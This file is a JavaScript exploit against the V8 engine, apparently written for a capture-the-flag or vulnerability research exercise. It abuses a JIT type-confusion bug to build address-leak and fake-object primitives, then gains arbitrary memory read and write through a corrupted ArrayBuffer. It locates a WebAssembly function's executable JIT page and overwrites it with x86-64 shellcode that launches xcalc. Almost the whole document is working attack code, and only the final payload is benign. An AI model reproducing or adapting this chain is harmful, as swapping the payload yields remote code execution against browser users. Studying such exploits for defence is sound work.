function hex(x)
{
	return '0x' + (x.toString(16)).padStart(16, 0);
}

function success(str, val){
    console.log("[+] " + str + " -> "+ hex(val));
}

function gc() 
{
    for (let i = 0; i < 100; i++) 
	{
        new ArrayBuffer(0x100000);
    }
}

class typeConvert
{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    f2u(val){        //double ==> Uint64
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2f(val){        //Uint64 ==> double
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}

var tC = new typeConvert();

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
let wasmFunc = wasmInstance.exports.main;

function addrOf(obj)
{
    let o = {a: 1.1, b: 2.2};
	function triggerFunc(o, callback)
	{
		let tmp = o.a;
		callback(tmp);
		return o.b;
	}
	function usableFunc()
	{
		o.b = obj;
	}
	for(let i=0; i<0x12000; i++)
	{
		triggerFunc(o,()=>1);
		triggerFunc(o,()=>2);
	}
	let ret = tC.f2u(triggerFunc(o,usableFunc));
	return ret;
}

function changeProperties(target, value)
{
	function func(o, callback0)
	{
		let tmp = o.c;
		callback0(tmp);
		o.d = value;
		return o.d;
	}
	var o = {
		c : 1.1
	};
	o.d = 2.2;
	//%DebugPrint(o); 
	//%SystemBreak();
	for(let i=0; i<0x12000; i++)
	{
		func(o,()=>1);
	}
	var o = {
		c : 1.1
	};
	o.d = 2.2;
	
	var res = func(o,function (){
			//%DebugPrint(o);
			//%SystemBreak();
			o.d = target;
			//%DebugPrint(o);
			//%DebugPrint(target);
			//%SystemBreak();
			});
}

var memviewBuf = new ArrayBuffer(1024);
var driverBuf = new ArrayBuffer(1024);
gc();
gc();

//%DebugPrint(driverBuf);
//%SystemBreak();
var bufAddr = addrOf(driverBuf);
var victim = {inline: 42};
victim.offset0  = {};
victim.offset8  = {};
victim.offset16 = {};
//%DebugPrint(victim);

changeProperties(victim, tC.u2f(bufAddr));
//%DebugPrint(victim);
//%SystemBreak();

victim.offset16 = memviewBuf;
//%DebugPrint(victim);
//%SystemBreak();

//obj = {x : 1};
//driverBuf.leakobj = obj;
//%DebugPrint(driverBuf);
//%SystemBreak();

var driver = new DataView(driverBuf);
class ArbitraryRW
{
	read(addr)
	{
		driver.setFloat64(31, tC.u2f(addr), true);
		var memView = new DataView(memviewBuf);
		return tC.f2u(memView.getFloat64(0,true));
	}
	write(addr, payload)
	{
		driver.setFloat64(31, tC.u2f(addr), true);
		var memView = new DataView(memviewBuf);
		for(let i=0; i<payload.length; i++)
		{
			memView.setUint8(i, payload[i]);
		}
	}
	leakObjF(objInput)
	{
		driverBuf.leakobj = objInput;
		//%DebugPrint(objInput);
		//%DebugPrint(driverBuf);
		//%SystemBreak();
		let propertiesAddr = this.read(bufAddr - 0x1 + 0x8);
		let objAddr = this.read(propertiesAddr - 0x1 + 0x10);
		return objAddr;
	}
	leakObj(obj)
	{
		driverBuf.leakobj = obj;
		let mapAddr = this.read(bufAddr-1);
		let instanceDescriptorsAddr = this.read(mapAddr - 0x1 + 0x30);
		let objAddr = this.read(instanceDescriptorsAddr - 0x1 + 0x30);
		return objAddr;
	}
}

let wr = new ArbitraryRW();


let wasmFuncAddr = wr.leakObj(wasmFunc);
success("wasmFuncAddr",wasmFuncAddr);
//%DebugPrint(wasmFunc);
//%SystemBreak();
let rwxJITAddr = wr.read(wasmFuncAddr - 0x1 + 0x38) - 0x1 + 0x60;
success("rwxJITAddr",rwxJITAddr)

function showCalc()
{
	let shellcode = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 0x52, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x00];
	wr.write(rwxJITAddr,shellcode);
	wasmFunc();
}

showCalc()

